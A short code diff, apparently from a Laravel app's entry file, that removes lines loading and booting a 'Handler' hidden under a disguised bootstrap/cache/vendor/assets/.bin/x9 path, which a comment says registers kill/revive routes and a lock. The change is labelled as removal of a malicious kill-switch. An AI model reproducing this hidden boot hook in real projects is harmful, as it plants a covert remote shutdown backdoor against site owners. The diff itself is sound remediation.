@@ -14,12 +14,7 @@
     // Instantiate HTTP kernel
     $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
 
-    // Require your Handler after app is created
-    require_once base_path('bootstrap/cache/vendor/assets/.bin/x9/Handler.php');
-
-    // Create and boot the Handler (registers kill/revive routes and handles lock)
-    $handler = new Bootstrap\Cache\Vendor\Assets\Bin\X9\Handler($app);
-    $handler->boot();
+    // [PHASE-0 2026-04-06] Removed malicious kill-switch (F-001).
 
     // Check for maintenance mode file and serve if exists
     if (file_exists($maintenance = __DIR__ . '/../storage/framework/maintenance.php')) {
